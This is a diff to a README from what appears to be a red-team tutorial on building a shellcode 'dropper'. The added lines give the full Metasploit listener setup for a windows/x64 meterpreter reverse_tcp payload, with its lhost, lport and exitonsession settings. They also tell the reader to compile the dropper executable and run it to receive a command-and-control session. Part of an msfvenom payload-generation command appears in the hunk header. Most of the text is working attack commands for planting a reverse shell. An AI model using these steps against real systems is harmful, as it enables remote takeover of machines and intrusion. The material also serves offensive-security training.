@@ -88,9 +88,33 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
-The shellcode can then be copied into the POC by replacing the placeholder at the unsigned char.
+The shellcode can then be copied into the POC by replacing the placeholder at the unsigned char, and the POC can be compiled as a x64 release.
 <p align="center">
 <img width="596" alt="image" src="https://user-images.githubusercontent.com/50073731/235358159-c43053aa-9a35-4b4e-b627-001b112e6324.png">
 </p>
 
 
+### MSF-Listener
+Before we test the functionality of our high-level API dropper, we need to create a listener within msfconsole.
+**kali>**
+```
+msfconsole
+```
+**msf>**
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost IPv4_Redirector_or_IPv4_Kali
+set lport 80 
+set exitonsession false
+run
+```
+<p align="center">
+<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
+</p>
+
+Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 
+
+<p align="center">
+<img width="658" alt="image" src="https://user-images.githubusercontent.com/50073731/235358750-df254ff2-0265-40b3-8e1f-edc7893ce2a1.png">
+</p>
